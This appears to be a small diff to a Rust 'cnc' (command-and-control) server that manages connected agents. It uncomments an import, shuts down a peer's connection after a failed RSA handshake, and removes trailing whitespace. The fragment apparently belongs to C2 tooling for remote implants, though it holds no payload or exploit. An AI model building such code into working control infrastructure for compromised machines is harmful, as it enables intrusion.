@@ -1,7 +1,7 @@
 use std::collections::HashMap;
 use std::io;
 use std::sync::Arc;
-// use tokio::io::AsyncWriteExt;
+use tokio::io::AsyncWriteExt;
 // use tokio::io::{AsyncWriteExt, Interest};
 use tokio::net::TcpListener;
 use tokio::sync::Mutex;
@@ -104,6 +104,8 @@ impl Server {
                                     HandleErrors::BadHandshakeFormat(addr)
                                     | HandleErrors::BadHandshakeRSA(addr) => {
                                         println!("Critical agent error! Closing connection and removing! peer: {:?}", addr);
+                                        // SHUTDOWN peer upon critical handshake error
+                                        lock.stream.lock().await.shutdown().await.unwrap();
                                         streams.remove(&id);
                                         break;
                                     }
@@ -138,7 +140,7 @@ pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) 
     Ok(())
 }
 
-// We want each agent to have an ID just so it will be easier to identify them 
+// We want each agent to have an ID just so it will be easier to identify them
 // later on.
 // this method generates a random number between 1 - 100,000
 pub fn generate_random_num() -> i32 {
